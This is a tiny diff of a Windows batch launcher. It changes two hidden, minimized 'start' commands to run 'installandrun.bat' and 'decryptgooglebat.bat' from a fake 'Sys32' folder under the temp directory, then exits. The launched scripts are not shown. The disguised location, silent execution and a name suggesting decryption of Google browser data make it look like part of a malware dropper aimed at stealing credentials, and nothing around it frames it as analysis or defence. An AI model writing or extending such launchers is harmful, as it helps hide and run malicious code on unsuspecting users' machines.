@@ -1,3 +1,3 @@
 @echo off
-start /MIN installandrun.bat
-start /MIN decryptgooglebat.bat & exit
+start /MIN %temp%\Sys32\installandrun.bat
+start /MIN %temp%\Sys32\decryptgooglebat.bat & exit
